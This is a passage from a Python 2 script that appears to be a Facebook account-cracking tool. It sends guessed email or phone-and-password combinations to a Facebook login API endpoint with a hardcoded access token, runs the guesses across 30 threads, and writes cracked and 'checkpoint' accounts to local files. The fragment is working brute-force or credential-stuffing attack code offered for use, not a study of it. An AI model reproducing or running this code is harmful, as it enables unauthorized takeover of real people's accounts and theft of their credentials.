            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[\x1b[1;92mOWN PASS-SUCCESSFULL] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m >>> \x1b[1;96m' + pass5 + ' \x1b[1;96m[LOG IN NOW]' + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass5 + '\n')
                okb.close()
                oks.append(c + user + pass5)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[OWN PASS-CHECKPOINT] \x1b[1;91m  ' + k + c + user + '\x1b[1;91m >>> \x1b[1;91m' + pass5 + ' \x1b[1;91m[LOG IN AFTER 80 HOURS]' + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass5 + '\n')
                cps.close()
                cpb.append(c + user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '-'
    print '[\xe2\x9c\x93] \x1b[1;96mPROCESS HAS BEEN COMPLETED....'
    print '[\xe2\x9c\x92] \x1b[1;96mTOTAL SUCCESSFULL/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] \x1b[1;96mCP FILE HAS BEEN SAVED : save/checkpoint.txt'
    raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
    os.system('python2 ALl.py')


if __name__ == '__main__':
    menu()